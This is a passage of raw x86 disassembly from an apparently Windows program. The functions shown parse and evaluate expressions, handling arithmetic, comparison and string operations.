  40c982:	je     0x40ca1f
  40c988:	mov    edi,DWORD PTR [ebx+0x4]
  40c98b:	push   0xb
  40c98d:	call   0x4050f7
  40c992:	xor    eax,eax
  40c994:	inc    eax
  40c995:	pop    ecx
  40c996:	mov    DWORD PTR [esp+0xc],eax
  40c99a:	mov    esi,0x4025f4
  40c99f:	test   BYTE PTR [edi+0x10],al
  40c9a2:	je     0x40c9b8
  40c9a4:	movzx  eax,WORD PTR [esi]
  40c9a7:	push   eax
  40c9a8:	push   0x4025e8
  40c9ad:	call   0x40c2d0
  40c9b2:	mov    eax,DWORD PTR [esp+0x14]
  40c9b6:	pop    ecx
  40c9b7:	pop    ecx
  40c9b8:	add    eax,eax
  40c9ba:	add    esi,0x2
  40c9bd:	mov    DWORD PTR [esp+0xc],eax
  40c9c1:	cmp    eax,0x10
  40c9c4:	jb     0x40c99f
  40c9c6:	mov    edx,DWORD PTR [edi+0x4]
  40c9c9:	mov    ecx,DWORD PTR [edi]
  40c9cb:	call   0x40c5fc
  40c9d0:	push   0xa
  40c9d2:	call   0x4050f7
  40c9d7:	mov    edi,DWORD PTR [edi+0x8]
  40c9da:	pop    ecx
  40c9db:	test   edi,edi
  40c9dd:	je     0x40ca0c
  40c9df:	cmp    DWORD PTR [edi+0x4],0x0
  40c9e3:	je     0x40ca04
  40c9e5:	push   DWORD PTR [edi+0x4]
  40c9e8:	push   0x4025b8
  40c9ed:	jmp    0x40c9fd
  40c9ef:	cmp    DWORD PTR [edi+0x4],0x0
  40c9f3:	je     0x40ca04
  40c9f5:	push   DWORD PTR [edi+0x4]
  40c9f8:	push   0x4025c0
  40c9fd:	call   0x40c2d0
  40ca02:	pop    ecx
  40ca03:	pop    ecx
  40ca04:	mov    edi,DWORD PTR [edi]
  40ca06:	test   edi,edi
  40ca08:	jne    0x40c9ef
  40ca0a:	jmp    0x40ca11
  40ca0c:	call   0x40c2df
  40ca11:	mov    ebx,DWORD PTR [ebx]
  40ca13:	test   ebx,ebx
  40ca15:	jne    0x40c988
  40ca1b:	mov    esi,DWORD PTR [esp+0x10]
  40ca1f:	mov    esi,DWORD PTR [esi]
  40ca21:	mov    DWORD PTR [esp+0x10],esi
  40ca25:	call   0x40c2df
  40ca2a:	test   esi,esi
  40ca2c:	jne    0x40c942
  40ca32:	mov    ebx,DWORD PTR [esp+0x14]
  40ca36:	add    ebx,0x4
  40ca39:	mov    DWORD PTR [esp+0x14],ebx
  40ca3d:	cmp    ebx,0x200
  40ca43:	jb     0x40c930
  40ca49:	call   0x40c2df
  40ca4e:	call   0x40c2b2
  40ca53:	pop    edi
  40ca54:	xor    eax,eax
  40ca56:	pop    esi
  40ca57:	mov    ds:0x421ef8,eax
  40ca5c:	mov    ds:0x421f04,eax
  40ca61:	mov    ds:0x421f08,eax
  40ca66:	pop    ebx
  40ca67:	mov    esp,ebp
  40ca69:	pop    ebp
  40ca6a:	ret    
  40ca6b:	push   ebp
  40ca6c:	mov    ebp,esp
  40ca6e:	push   ecx
  40ca6f:	push   esi
  40ca70:	mov    esi,DWORD PTR ds:0x432654
  40ca76:	push   edi
  40ca77:	mov    edi,esi
  40ca79:	sub    esi,0x8
  40ca7c:	mov    al,BYTE PTR [edi]
  40ca7e:	mov    DWORD PTR ds:0x432654,esi
  40ca84:	cmp    al,0x16
  40ca86:	jne    0x40cbc9
  40ca8c:	cmp    BYTE PTR [esi],al
  40ca8e:	jne    0x40cbc9
  40ca94:	movzx  eax,BYTE PTR [ebp+0x8]
  40ca98:	dec    eax
  40ca99:	cmp    eax,0x11
  40ca9c:	ja     0x40cc61
  40caa2:	jmp    DWORD PTR [eax*4+0x40cc6b]
  40caa9:	xor    eax,eax
  40caab:	cmp    DWORD PTR [esi+0x4],eax
  40caae:	jne    0x40cab9
  40cab0:	cmp    DWORD PTR [edi+0x4],eax
  40cab3:	je     0x40cbc1
  40cab9:	xor    eax,eax
  40cabb:	inc    eax
  40cabc:	jmp    0x40cbc1
  40cac1:	xor    eax,eax
  40cac3:	cmp    DWORD PTR [esi+0x4],eax
  40cac6:	je     0x40cbc1
  40cacc:	jmp    0x40cab0
  40cace:	mov    eax,DWORD PTR [edi+0x4]
  40cad1:	or     DWORD PTR [esi+0x4],eax
  40cad4:	jmp    0x40cc5d
  40cad9:	mov    eax,DWORD PTR [edi+0x4]
  40cadc:	xor    DWORD PTR [esi+0x4],eax
  40cadf:	jmp    0x40cc5d
  40cae4:	mov    eax,DWORD PTR [edi+0x4]
  40cae7:	and    DWORD PTR [esi+0x4],eax
  40caea:	jmp    0x40cc5d
  40caef:	mov    eax,DWORD PTR [edi+0x4]
  40caf2:	xor    ecx,ecx
  40caf4:	cmp    eax,DWORD PTR [esi+0x4]
  40caf7:	setne  cl
  40cafa:	mov    DWORD PTR [esi+0x4],ecx
  40cafd:	jmp    0x40cc5d
  40cb02:	mov    eax,DWORD PTR [edi+0x4]
  40cb05:	sub    eax,DWORD PTR [esi+0x4]
  40cb08:	neg    eax
  40cb0a:	sbb    eax,eax
  40cb0c:	inc    eax
  40cb0d:	jmp    0x40cbc1
  40cb12:	mov    eax,DWORD PTR [esi+0x4]
  40cb15:	xor    ecx,ecx
  40cb17:	cmp    eax,DWORD PTR [edi+0x4]
  40cb1a:	setg   cl
  40cb1d:	jmp    0x40cafa
  40cb1f:	mov    eax,DWORD PTR [esi+0x4]
  40cb22:	xor    ecx,ecx
  40cb24:	cmp    eax,DWORD PTR [edi+0x4]
  40cb27:	setl   cl
  40cb2a:	jmp    0x40cafa
  40cb2c:	mov    eax,DWORD PTR [esi+0x4]
  40cb2f:	xor    ecx,ecx
  40cb31:	cmp    eax,DWORD PTR [edi+0x4]
  40cb34:	setge  cl
  40cb37:	jmp    0x40cafa
  40cb39:	mov    eax,DWORD PTR [esi+0x4]
  40cb3c:	xor    ecx,ecx
  40cb3e:	cmp    eax,DWORD PTR [edi+0x4]
  40cb41:	setle  cl
  40cb44:	jmp    0x40cafa
  40cb46:	mov    ecx,DWORD PTR [edi+0x4]
  40cb49:	sar    DWORD PTR [esi+0x4],cl
  40cb4c:	jmp    0x40cc5d
  40cb51:	mov    ecx,DWORD PTR [edi+0x4]
  40cb54:	shl    DWORD PTR [esi+0x4],cl
  40cb57:	jmp    0x40cc5d
  40cb5c:	mov    eax,DWORD PTR [edi+0x4]
  40cb5f:	sub    DWORD PTR [esi+0x4],eax
  40cb62:	jmp    0x40cc5d
  40cb67:	mov    eax,DWORD PTR [edi+0x4]
  40cb6a:	add    DWORD PTR [esi+0x4],eax
  40cb6d:	jmp    0x40cc5d
  40cb72:	cmp    DWORD PTR [edi+0x4],0x0
  40cb76:	jne    0x40cb8a
  40cb78:	push   0x437
  40cb7d:	push   DWORD PTR ds:0x4216d4
  40cb83:	call   0x405021
  40cb88:	pop    ecx
  40cb89:	pop    ecx
  40cb8a:	mov    eax,DWORD PTR [esi+0x4]
  40cb8d:	cdq    
  40cb8e:	idiv   DWORD PTR [edi+0x4]
  40cb91:	mov    DWORD PTR [esi+0x4],edx
  40cb94:	jmp    0x40cc5d
  40cb99:	cmp    DWORD PTR [edi+0x4],0x0
  40cb9d:	jne    0x40cbb1
  40cb9f:	push   0x437
  40cba4:	push   DWORD PTR ds:0x4216d4
  40cbaa:	call   0x405021
  40cbaf:	pop    ecx
  40cbb0:	pop    ecx
  40cbb1:	mov    eax,DWORD PTR [esi+0x4]
  40cbb4:	cdq    
  40cbb5:	idiv   DWORD PTR [edi+0x4]
  40cbb8:	jmp    0x40cbc1
  40cbba:	mov    eax,DWORD PTR [esi+0x4]
  40cbbd:	imul   eax,DWORD PTR [edi+0x4]
  40cbc1:	mov    DWORD PTR [esi+0x4],eax
  40cbc4:	jmp    0x40cc5d
  40cbc9:	cmp    al,0x17
  40cbcb:	jne    0x40cc61
  40cbd1:	cmp    BYTE PTR [esi],al
  40cbd3:	jne    0x40cc61
  40cbd9:	mov    ecx,DWORD PTR [edi+0x4]
  40cbdc:	mov    eax,DWORD PTR [esi+0x4]
  40cbdf:	mov    dx,WORD PTR [eax]
  40cbe2:	cmp    dx,WORD PTR [ecx]
  40cbe5:	jne    0x40cc05
  40cbe7:	test   dx,dx
  40cbea:	je     0x40cc01
  40cbec:	mov    dx,WORD PTR [eax+0x2]
  40cbf0:	cmp    dx,WORD PTR [ecx+0x2]
  40cbf4:	jne    0x40cc05
  40cbf6:	add    eax,0x4
  40cbf9:	add    ecx,0x4
  40cbfc:	test   dx,dx
  40cbff:	jne    0x40cbdf
  40cc01:	xor    edx,edx
  40cc03:	jmp    0x40cc0a
  40cc05:	sbb    edx,edx
  40cc07:	or     edx,0x1
  40cc0a:	movzx  eax,BYTE PTR [ebp+0x8]
  40cc0e:	sub    eax,0x6
  40cc11:	je     0x40cc50
  40cc13:	dec    eax
  40cc14:	je     0x40cc44
  40cc16:	dec    eax
  40cc17:	je     0x40cc3b
  40cc19:	dec    eax
  40cc1a:	je     0x40cc32
  40cc1c:	dec    eax
  40cc1d:	je     0x40cc29
  40cc1f:	dec    eax
  40cc20:	jne    0x40cc61
  40cc22:	test   edx,edx
  40cc24:	setle  al
  40cc27:	jmp    0x40cc4b
  40cc29:	xor    eax,eax
  40cc2b:	test   edx,edx
  40cc2d:	setns  al
  40cc30:	jmp    0x40cc4b
  40cc32:	xor    eax,eax
  40cc34:	test   edx,edx
  40cc36:	sets   al
  40cc39:	jmp    0x40cc4b
  40cc3b:	xor    eax,eax
  40cc3d:	test   edx,edx
  40cc3f:	setg   al
  40cc42:	jmp    0x40cc4b
  40cc44:	xor    eax,eax
  40cc46:	test   edx,edx
  40cc48:	sete   al
  40cc4b:	mov    DWORD PTR [esi+0x4],eax
  40cc4e:	jmp    0x40cc5a
  40cc50:	xor    ecx,ecx
  40cc52:	test   edx,edx
  40cc54:	setne  cl
  40cc57:	mov    DWORD PTR [esi+0x4],ecx
  40cc5a:	mov    BYTE PTR [esi],0x16
  40cc5d:	mov    al,0x1
  40cc5f:	jmp    0x40cc63
  40cc61:	xor    al,al
  40cc63:	pop    edi
  40cc64:	pop    esi
  40cc65:	pop    ecx
  40cc66:	pop    ebp
  40cc67:	ret    0x4
  40cc6a:	nop
  40cc6b:	test   eax,0xc10040ca
  40cc70:	retf   0x40
  40cc73:	into   
  40cc74:	retf   0x40
  40cc77:	fxch   st(2)
  40cc79:	inc    eax
  40cc7a:	add    ah,ah
  40cc7c:	retf   0x40
  40cc7f:	out    dx,eax
  40cc80:	retf   0x40
  40cc83:	add    cl,bl
  40cc85:	inc    eax
  40cc86:	add    BYTE PTR [edx],dl
  40cc88:	retf   
  40cc89:	inc    eax
  40cc8a:	add    BYTE PTR [edi],bl
  40cc8c:	retf   
  40cc8d:	inc    eax
  40cc8e:	add    BYTE PTR [ebx+ecx*8],ch
  40cc91:	inc    eax
  40cc92:	add    BYTE PTR [ecx],bh
  40cc94:	retf   
  40cc95:	inc    eax
  40cc96:	add    BYTE PTR [esi-0x35],al
  40cc99:	inc    eax
  40cc9a:	add    BYTE PTR [ecx-0x35],dl
  40cc9d:	inc    eax
  40cc9e:	add    BYTE PTR [ebx+ecx*8+0x40],bl
  40cca2:	add    BYTE PTR [edi-0x35],ah
  40cca5:	inc    eax
  40cca6:	add    BYTE PTR [edx-0x35],dh
  40cca9:	inc    eax
  40ccaa:	add    BYTE PTR [ecx-0x45ffbf35],bl
  40ccb0:	retf   
  40ccb1:	inc    eax
  40ccb2:	add    BYTE PTR [ebp-0x75],dl
  40ccb5:	in     al,dx
  40ccb6:	mov    ecx,DWORD PTR ds:0x432654
  40ccbc:	cmp    BYTE PTR [ecx],0x16
  40ccbf:	jne    0x40cce7
  40ccc1:	movzx  eax,BYTE PTR [ebp+0x8]
  40ccc5:	sub    eax,0x13
  40ccc8:	je     0x40cce0
  40ccca:	dec    eax
  40cccb:	je     0x40ccdb
  40cccd:	dec    eax
  40ccce:	jne    0x40cce7
  40ccd0:	cmp    DWORD PTR [ecx+0x4],eax
  40ccd3:	sete   al
  40ccd6:	mov    DWORD PTR [ecx+0x4],eax
  40ccd9:	jmp    0x40cce3
  40ccdb:	not    DWORD PTR [ecx+0x4]
  40ccde:	jmp    0x40cce3
  40cce0:	neg    DWORD PTR [ecx+0x4]
  40cce3:	mov    al,0x1
  40cce5:	jmp    0x40cce9
  40cce7:	xor    al,al
  40cce9:	pop    ebp
  40ccea:	ret    0x4
  40cced:	mov    eax,ds:0x432658
  40ccf2:	add    eax,0x2
  40ccf5:	push   esi
  40ccf6:	mov    ds:0x432658,eax
  40ccfb:	movzx  ecx,WORD PTR [eax]
  40ccfe:	push   0x22
  40cd00:	mov    esi,eax
  40cd02:	pop    edx
  40cd03:	test   cx,cx
  40cd06:	je     0x40cd2c
  40cd08:	cmp    cx,dx
  40cd0b:	jne    0x40cd16
  40cd0d:	cmp    WORD PTR [eax+0x2],dx
  40cd11:	jne    0x40cd26
  40cd13:	add    eax,0x2
  40cd16:	add    eax,0x2
  40cd19:	mov    ds:0x432658,eax
  40cd1e:	movzx  ecx,WORD PTR [eax]
  40cd21:	test   cx,cx
  40cd24:	jne    0x40cd08
  40cd26:	cmp    WORD PTR [eax],0x0
  40cd2a:	jne    0x40cd45
  40cd2c:	push   edx
  40cd2d:	push   0x3fe
  40cd32:	push   DWORD PTR ds:0x4216d4
  40cd38:	call   0x405021
  40cd3d:	mov    eax,ds:0x432658
  40cd42:	add    esp,0xc
  40cd45:	xor    ecx,ecx
  40cd47:	mov    WORD PTR [eax],cx
  40cd4a:	add    DWORD PTR ds:0x432658,0x2
  40cd51:	mov    eax,esi
  40cd53:	pop    esi
  40cd54:	ret    
  40cd55:	push   ebp
  40cd56:	mov    ebp,esp
  40cd58:	push   ecx
  40cd59:	mov    ecx,DWORD PTR ds:0x432658
  40cd5f:	push   ebx
  40cd60:	add    ecx,0x2
  40cd63:	push   esi
  40cd64:	push   edi
  40cd65:	mov    DWORD PTR ds:0x432658,ecx
  40cd6b:	movzx  eax,WORD PTR [ecx]
  40cd6e:	push   0x5d
  40cd70:	mov    edi,ecx
  40cd72:	pop    edx
  40cd73:	test   ax,ax
  40cd76:	je     0x40cdda
  40cd78:	and    DWORD PTR [ebp-0x4],0x0
  40cd7c:	cmp    ax,0x5e
  40cd80:	jne    0x40cdbd
  40cd82:	lea    esi,[ecx+0x2]
  40cd85:	cmp    WORD PTR [esi],dx
  40cd88:	jne    0x40cdbd
  40cd8a:	mov    edx,esi
  40cd8c:	lea    ebx,[edx+0x2]
  40cd8f:	mov    ax,WORD PTR [edx]
  40cd92:	add    edx,0x2
  40cd95:	cmp    ax,WORD PTR [ebp-0x4]
  40cd99:	jne    0x40cd8f
  40cd9b:	sub    edx,ebx
  40cd9d:	sar    edx,1
  40cd9f:	lea    eax,[edx*2+0x2]
  40cda6:	push   eax
  40cda7:	push   esi
  40cda8:	push   ecx
  40cda9:	call   DWORD PTR ds:0x437444
  40cdaf:	mov    ecx,DWORD PTR ds:0x432658
  40cdb5:	add    esp,0xc
  40cdb8:	push   0x5d
  40cdba:	pop    edx
  40cdbb:	jmp    0x40cdc2
  40cdbd:	cmp    ax,dx
  40cdc0:	je     0x40cdd3
  40cdc2:	add    ecx,0x2
  40cdc5:	mov    DWORD PTR ds:0x432658,ecx
  40cdcb:	movzx  eax,WORD PTR [ecx]
  40cdce:	test   ax,ax
  40cdd1:	jne    0x40cd7c
  40cdd3:	xor    eax,eax
  40cdd5:	cmp    WORD PTR [ecx],ax
  40cdd8:	jne    0x40cdf4
  40cdda:	push   edx
  40cddb:	push   0x3fe
  40cde0:	push   DWORD PTR ds:0x4216d4
  40cde6:	call   0x405021
  40cdeb:	mov    ecx,DWORD PTR ds:0x432658
  40cdf1:	add    esp,0xc
  40cdf4:	xor    eax,eax
  40cdf6:	mov    WORD PTR [ecx],ax
  40cdf9:	add    DWORD PTR ds:0x432658,0x2
  40ce00:	mov    eax,edi
  40ce02:	pop    edi
  40ce03:	pop    esi
  40ce04:	pop    ebx
  40ce05:	leave  
  40ce06:	ret    
  40ce07:	push   ecx
  40ce08:	push   ebx
  40ce09:	mov    bh,cl
  40ce0b:	push   esi
  40ce0c:	mov    esi,edx
  40ce0e:	cmp    bh,0x19
  40ce11:	jne    0x40ce17
  40ce13:	mov    bl,0x3
  40ce15:	jmp    0x40ce30
  40ce17:	test   bh,bh
  40ce19:	jne    0x40ce1f
  40ce1b:	mov    bl,0x4
  40ce1d:	jmp    0x40ce30
  40ce1f:	cmp    bh,0x15
  40ce22:	jbe    0x40ce28
  40ce24:	xor    bl,bl
  40ce26:	jmp    0x40ce30
  40ce28:	cmp    bh,0x12
  40ce2b:	seta   bl
  40ce2e:	inc    bl
  40ce30:	movzx  ecx,BYTE PTR ds:0x432645
  40ce37:	imul   ecx,ecx,0x5
  40ce3a:	movzx  eax,bl
  40ce3d:	cmp    BYTE PTR [ecx+eax*1+0x411128],0x0
  40ce45:	jne    0x40ce59
  40ce47:	push   0x3ff
  40ce4c:	push   DWORD PTR ds:0x4216d4
  40ce52:	call   0x405021
  40ce57:	pop    ecx
  40ce58:	pop    ecx
  40ce59:	mov    DWORD PTR ds:0x43264c,esi
  40ce5f:	pop    esi
  40ce60:	mov    BYTE PTR ds:0x432645,bl
  40ce66:	mov    BYTE PTR ds:0x432647,bh
  40ce6c:	mov    BYTE PTR ds:0x432648,bh
  40ce72:	pop    ebx
  40ce73:	pop    ecx
  40ce74:	ret    
  40ce75:	push   ebp
  40ce76:	mov    ebp,esp
  40ce78:	push   ecx
  40ce79:	mov    eax,ds:0x432658
  40ce7e:	push   ebx
  40ce7f:	push   esi
  40ce80:	push   edi
  40ce81:	push   0x20
  40ce83:	pop    edx
  40ce84:	push   0x9
  40ce86:	pop    edi
  40ce87:	push   0x2
  40ce89:	pop    esi
  40ce8a:	movzx  ecx,WORD PTR [eax]
  40ce8d:	cmp    cx,dx
  40ce90:	je     0x40ce97
  40ce92:	cmp    cx,di
  40ce95:	jne    0x40cea0
  40ce97:	add    eax,esi
  40ce99:	mov    ds:0x432658,eax
  40ce9e:	jmp    0x40ce8a
  40cea0:	cmp    cx,0x28
  40cea4:	je     0x40cec0
  40cea6:	push   0x3ff
  40ceab:	push   DWORD PTR ds:0x4216d4
  40ceb1:	call   0x405021
  40ceb6:	mov    eax,ds:0x432658
  40cebb:	pop    ecx
  40cebc:	pop    ecx
  40cebd:	push   0x20
  40cebf:	pop    edx
  40cec0:	add    eax,esi
  40cec2:	mov    ds:0x432658,eax
  40cec7:	movzx  ecx,WORD PTR [eax]
  40ceca:	cmp    cx,dx
  40cecd:	je     0x40cec0
  40cecf:	cmp    cx,di
  40ced2:	je     0x40cec0
  40ced4:	cmp    cx,0x22
  40ced8:	jne    0x40cf29
  40ceda:	call   0x40cced
  40cedf:	mov    ecx,DWORD PTR ds:0x432658
  40cee5:	push   0x20
  40cee7:	mov    ebx,eax
  40cee9:	pop    eax
  40ceea:	movzx  edx,WORD PTR [ecx]
  40ceed:	cmp    dx,ax
  40cef0:	je     0x40cef7
  40cef2:	cmp    dx,di
  40cef5:	jne    0x40cf01
  40cef7:	add    ecx,esi
  40cef9:	mov    DWORD PTR ds:0x432658,ecx
  40ceff:	jmp    0x40ceea
  40cf01:	cmp    dx,0x29
  40cf05:	je     0x40cf1f
  40cf07:	push   0x3ff
  40cf0c:	push   DWORD PTR ds:0x4216d4
  40cf12:	call   0x405021
  40cf17:	pop    ecx
  40cf18:	pop    ecx
  40cf19:	mov    ecx,DWORD PTR ds:0x432658
  40cf1f:	add    ecx,esi
  40cf21:	mov    DWORD PTR ds:0x432658,ecx
  40cf27:	jmp    0x40cf77
  40cf29:	push   0x29
  40cf2b:	mov    DWORD PTR [ebp-0x4],eax
  40cf2e:	pop    ebx
  40cf2f:	mov    edi,eax
  40cf31:	movzx  esi,WORD PTR [eax]
  40cf34:	add    eax,0x2
  40cf37:	mov    ds:0x432658,eax
  40cf3c:	test   si,si
  40cf3f:	jne    0x40cf5b
  40cf41:	push   0x3ff
  40cf46:	push   DWORD PTR ds:0x4216d4
  40cf4c:	call   0x405021
  40cf51:	mov    eax,ds:0x432658
  40cf56:	pop    ecx
  40cf57:	pop    ecx
  40cf58:	push   0x20
  40cf5a:	pop    edx
  40cf5b:	cmp    si,bx
  40cf5e:	je     0x40cf6f
  40cf60:	cmp    si,dx
  40cf63:	je     0x40cf31
  40cf65:	push   0x9
  40cf67:	pop    ecx
  40cf68:	cmp    si,cx
  40cf6b:	je     0x40cf31
  40cf6d:	jmp    0x40cf2f
  40cf6f:	mov    ebx,DWORD PTR [ebp-0x4]
  40cf72:	xor    eax,eax
  40cf74:	mov    WORD PTR [edi],ax
  40cf77:	pop    edi
  40cf78:	pop    esi
  40cf79:	mov    eax,ebx
  40cf7b:	pop    ebx
  40cf7c:	leave  
  40cf7d:	ret    
  40cf7e:	int3   
  40cf7f:	mov    ecx,DWORD PTR ds:0x432658
  40cf85:	push   ebx
  40cf86:	push   esi
  40cf87:	push   edi
  40cf88:	movzx  esi,WORD PTR [ecx]
  40cf8b:	cmp    si,0x20
  40cf8f:	je     0x40cf97
  40cf91:	cmp    si,0x9
  40cf95:	jne    0x40cfa2
  40cf97:	add    ecx,0x2
  40cf9a:	mov    DWORD PTR ds:0x432658,ecx
  40cfa0:	jmp    0x40cf88
  40cfa2:	mov    eax,0x80
  40cfa7:	xor    ebx,ebx
  40cfa9:	cmp    si,ax
  40cfac:	jae    0x40d01d
  40cfae:	movzx  eax,si
  40cfb1:	test   BYTE PTR [eax+0x4010a8],0x2
  40cfb8:	je     0x40d01d
  40cfba:	mov    eax,ds:0x411078
  40cfbf:	mov    edi,0x411078
  40cfc4:	jmp    0x40cfef
  40cfc6:	movzx  ebx,WORD PTR [eax]
  40cfc9:	mov    edx,ecx
  40cfcb:	test   bx,bx
  40cfce:	je     0x40d011
  40cfd0:	cmp    WORD PTR [edx],bx
  40cfd3:	jne    0x40cfe3
  40cfd5:	add    eax,0x2
  40cfd8:	add    edx,0x2
  40cfdb:	movzx  ebx,WORD PTR [eax]
  40cfde:	test   bx,bx
  40cfe1:	jne    0x40cfd0
  40cfe3:	xor    ebx,ebx
  40cfe5:	cmp    WORD PTR [eax],bx
  40cfe8:	je     0x40d013
  40cfea:	add    edi,0x8
  40cfed:	mov    eax,DWORD PTR [edi]
  40cfef:	test   eax,eax
  40cff1:	jne    0x40cfc6
  40cff3:	cmp    si,0x2d
  40cff7:	jne    0x40d037
  40cff9:	add    ecx,0x2
  40cffc:	xor    edx,edx
  40cffe:	cmp    BYTE PTR ds:0x432647,0x16
  40d005:	mov    DWORD PTR ds:0x432658,ecx
  40d00b:	jne    0x40d033
  40d00d:	mov    cl,0xe
  40d00f:	jmp    0x40d02b
  40d011:	xor    ebx,ebx
  40d013:	mov    ecx,edx
  40d015:	mov    DWORD PTR ds:0x432658,ecx
  40d01b:	jmp    0x40d022
  40d01d:	mov    edi,0x411120
  40d022:	cmp    DWORD PTR [edi],ebx
  40d024:	je     0x40cff3
  40d026:	mov    cl,BYTE PTR [edi+0x4]
  40d029:	xor    edx,edx
  40d02b:	pop    edi
  40d02c:	pop    esi
  40d02d:	pop    ebx
  40d02e:	jmp    0x40ce07
  40d033:	mov    cl,0x13
  40d035:	jmp    0x40d02b
  40d037:	push   0x22
  40d039:	pop    eax
  40d03a:	cmp    si,ax
  40d03d:	jne    0x40d04a
  40d03f:	call   0x40cced
  40d044:	mov    edx,eax
  40d046:	mov    cl,0x17
  40d048:	jmp    0x40d02b
  40d04a:	cmp    si,0x5b
  40d04e:	jne    0x40d05b
  40d050:	call   0x40cd55
  40d055:	mov    edx,eax
  40d057:	mov    cl,0x18
  40d059:	jmp    0x40d02b
  40d05b:	push   esi
  40d05c:	call   DWORD PTR ds:0x4373f4
  40d062:	pop    ecx
  40d063:	test   eax,eax
  40d065:	je     0x40d0dc
  40d067:	mov    esi,DWORD PTR ds:0x4373fc
  40d06d:	mov    ebx,DWORD PTR ds:0x432658
  40d073:	call   esi
  40d075:	and    DWORD PTR [eax],0x0
  40d078:	push   0x0
  40d07a:	push   0x432658
  40d07f:	push   DWORD PTR ds:0x432658
  40d085:	call   DWORD PTR ds:0x4374d0
  40d08b:	add    esp,0xc
  40d08e:	mov    edi,eax
  40d090:	call   esi
  40d092:	cmp    DWORD PTR [eax],0x22
  40d095:	jne    0x40d0b6
  40d097:	mov    ecx,DWORD PTR ds:0x432658
  40d09d:	push   ebx
  40d09e:	push   0x436
  40d0a3:	push   DWORD PTR ds:0x4216d4
  40d0a9:	xor    eax,eax
  40d0ab:	mov    WORD PTR [ecx],ax
  40d0ae:	call   0x405021
  40d0b3:	add    esp,0xc
  40d0b6:	mov    eax,ds:0x432658
  40d0bb:	movzx  eax,WORD PTR [eax]
  40d0be:	push   eax
  40d0bf:	call   DWORD PTR ds:0x43740c
  40d0c5:	pop    ecx
  40d0c6:	cmp    ax,0x4c
  40d0ca:	jne    0x40d0d3
  40d0cc:	add    DWORD PTR ds:0x432658,0x2
  40d0d3:	mov    edx,edi
  40d0d5:	mov    cl,0x16
  40d0d7:	jmp    0x40d02b
  40d0dc:	test   si,si
  40d0df:	jne    0x40d0f1
  40d0e1:	xor    edx,edx
  40d0e3:	mov    BYTE PTR ds:0x432646,0x1
  40d0ea:	xor    cl,cl
  40d0ec:	jmp    0x40d02b
  40d0f1:	mov    esi,DWORD PTR ds:0x437414
  40d0f7:	push   0x7
  40d0f9:	push   0x40265c
  40d0fe:	push   DWORD PTR ds:0x432658
  40d104:	call   esi
  40d106:	add    esp,0xc
  40d109:	test   eax,eax
  40d10b:	jne    0x40d125
  40d10d:	add    DWORD PTR ds:0x432658,0xe
  40d114:	call   0x40ce75
  40d119:	mov    ecx,eax
  40d11b:	call   0x40d3d4
  40d120:	movzx  edx,al
  40d123:	jmp    0x40d0d5
  40d125:	push   0x6
  40d127:	push   0x40266c
  40d12c:	push   DWORD PTR ds:0x432658
  40d132:	call   esi
  40d134:	add    esp,0xc
  40d137:	test   eax,eax
  40d139:	jne    0x40d159
  40d13b:	add    DWORD PTR ds:0x432658,0xc
  40d142:	call   0x40ce75
  40d147:	push   ebx
  40d148:	push   eax
  40d149:	call   DWORD PTR ds:0x4374ac
  40d14f:	neg    eax
  40d151:	pop    ecx
  40d152:	sbb    al,al
  40d154:	pop    ecx
  40d155:	inc    al
  40d157:	jmp    0x40d120
  40d159:	push   0x5
  40d15b:	push   0x40267c
  40d160:	push   DWORD PTR ds:0x432658
  40d166:	call   esi
  40d168:	add    esp,0xc
  40d16b:	test   eax,eax
  40d16d:	jne    0x40d178
  40d16f:	add    DWORD PTR ds:0x432658,0xa
  40d176:	jmp    0x40d142
  40d178:	push   0x3ff
  40d17d:	push   DWORD PTR ds:0x4216d4
  40d183:	call   0x405021
  40d188:	pop    ecx
  40d189:	pop    ecx
  40d18a:	pop    edi
  40d18b:	pop    esi
  40d18c:	pop    ebx
  40d18d:	ret    
  40d18e:	mov    ecx,DWORD PTR ds:0x432654
  40d194:	push   esi
  40d195:	mov    esi,0x432660
  40d19a:	cmp    DWORD PTR ds:0x432650,esi
  40d1a0:	jbe    0x40d217
  40d1a2:	mov    al,BYTE PTR [esi]
  40d1a4:	cmp    al,0x15
  40d1a6:	jbe    0x40d1df
  40d1a8:	add    ecx,0x8
  40d1ab:	mov    DWORD PTR ds:0x432654,ecx
  40d1b1:	cmp    al,0x18
  40d1b3:	jne    0x40d1d3
  40d1b5:	mov    ecx,DWORD PTR [esi+0x4]
  40d1b8:	push   0x0
  40d1ba:	push   0x0
  40d1bc:	push   0x1
  40d1be:	xor    dl,dl
  40d1c0:	call   0x4065b2
  40d1c5:	mov    ecx,DWORD PTR ds:0x432654
  40d1cb:	mov    DWORD PTR [ecx+0x4],eax
  40d1ce:	mov    BYTE PTR [ecx],0x16
  40d1d1:	jmp    0x40d20c
  40d1d3:	mov    eax,DWORD PTR [esi]
  40d1d5:	mov    DWORD PTR [ecx],eax
  40d1d7:	mov    eax,DWORD PTR [esi+0x4]
  40d1da:	mov    DWORD PTR [ecx+0x4],eax
  40d1dd:	jmp    0x40d20c
  40d1df:	mov    ecx,0x40ccb3
  40d1e4:	cmp    al,0x12
  40d1e6:	ja     0x40d1ed
  40d1e8:	mov    ecx,0x40ca6b
  40d1ed:	push   eax
  40d1ee:	call   ecx
  40d1f0:	test   al,al
  40d1f2:	jne    0x40d206
  40d1f4:	push   0x438
  40d1f9:	push   DWORD PTR ds:0x4216d4
  40d1ff:	call   0x405021
  40d204:	pop    ecx
  40d205:	pop    ecx
  40d206:	mov    ecx,DWORD PTR ds:0x432654
  40d20c:	add    esi,0x8
  40d20f:	cmp    esi,DWORD PTR ds:0x432650
  40d215:	jb     0x40d1a2
  40d217:	cmp    ecx,0x434660
  40d21d:	jne    0x40d22d
  40d21f:	cmp    BYTE PTR [ecx],0x16
  40d222:	jne    0x40d22d
  40d224:	cmp    DWORD PTR [ecx+0x4],0x0
  40d228:	setne  al
  40d22b:	pop    esi
  40d22c:	ret    
  40d22d:	push   0x3ff
  40d232:	push   DWORD PTR ds:0x4216d4
  40d238:	call   0x405021
  40d23d:	pop    ecx
  40d23e:	pop    ecx
  40d23f:	xor    al,al
  40d241:	pop    esi
  40d242:	ret    
  40d243:	push   ecx
  40d244:	mov    ecx,DWORD PTR ds:0x432654
  40d24a:	cmp    ecx,0x434660
  40d250:	jae    0x40d26a
  40d252:	push   0x3ff
  40d257:	push   DWORD PTR ds:0x4216d4
  40d25d:	call   0x405021
  40d262:	pop    ecx
  40d263:	pop    ecx
  40d264:	mov    ecx,DWORD PTR ds:0x432654
  40d26a:	mov    edx,DWORD PTR ds:0x432650
  40d270:	cmp    edx,0x434658
  40d276:	jbe    0x40d296
  40d278:	push   0x412
